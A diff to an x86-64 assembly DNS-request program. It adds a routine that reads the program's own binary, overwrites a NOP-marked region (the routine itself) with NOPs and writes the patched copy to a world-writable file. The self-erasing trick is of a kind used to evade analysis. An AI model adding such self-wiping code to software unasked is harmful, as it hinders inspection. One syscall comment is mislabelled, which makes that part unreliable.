@@ -17,6 +17,10 @@ endstruc
 section .data
 
 
+    output_file db '/home/jules/output', 0
+    output_file_size equ $ - output_file
+
+
     sock_addr:
         istruc sockaddr
             at sin_family,	dw	0x02
@@ -48,6 +52,10 @@ section .data
 
 section .bss
 
+
+    buf resb 20000
+    buf_size equ $ - buf
+
     request_content: resb 500
     request_content_size EQU $ - request_content
 
@@ -73,6 +81,96 @@ _start:
     push rbp
     mov rbp, rsp
     sub rsp, 0x40
+
+    nop
+    nop
+    nop
+    nop
+
+    mov rsi, rbp
+    add rsi, 0x10
+    mov rsi, [rsi]
+
+
+    mov rax, 0x02
+    mov rdi, rsi
+    mov rsi, 0x00
+    mov rdx, 0x00
+    syscall
+
+    mov [rbp - 0x08], rax
+
+    mov rdi, rax
+    mov rsi, 0x00
+    mov rdx, 0x02
+    mov rax, 0x08
+    syscall ; lseek(fd, 0, SEEK_end)
+
+    mov [rbp - 0x10], rax
+
+    mov rdi, [rbp - 0x08]
+    mov rsi, 0x00
+    mov rdx, 0x00
+    mov rax, 0x08
+    syscall ; lseek(fd, 0, SEEK_end)
+
+
+    mov rsi, buf
+    mov rdi, 0x03
+    mov rdx, [rbp - 0x10]
+    mov rax, 0x00
+    syscall ; read(fd, buf, buf_size)
+
+
+    mov rdi, buf
+    xor rcx, rcx
+    mov eax, 0x10101010
+    or eax, 0x80808080
+    .check:
+        
+        scasd
+        je .clean
+        sub rdi, 0x03
+        jmp .check
+
+    .clean:
+        jmp .clean_loop
+
+    .clean_loop:
+        mov byte [rdi], 0x90
+        scasd
+        je .clean_end
+        sub rdi, 0x03
+        jmp .clean_loop
+
+    .clean_end:
+
+
+
+
+
+    mov rdi, output_file
+    mov rsi, 0x42
+    mov rdx, 0q00777
+    mov rax, 0x02
+    syscall ; open(output_file, O_CREAT | O_WRONLY, 0777)
+
+    mov [rbp - 0x18], rax
+
+    mov rdi, [rbp - 0x18]
+    mov rsi, buf
+    mov rdx, [rbp - 0x10]
+    mov rax, 0x01
+    syscall ; write(fd, buf, buf_size)
+
+    mov rdi, [rbp - 0x18]
+    mov rax, 0x03
+    syscall
+
+    nop
+    nop
+    nop
+    nop
 
     
     mov rdi, 0x2 ; AF_INET
@@ -221,6 +319,8 @@ write_dns_request:
     push rbp
     mov rbp, rsp
     sub rsp, 0x40
+
+
 
     mov rdi, dns_ID ; buffer
     mov rsi, 0x02 ; buffer size
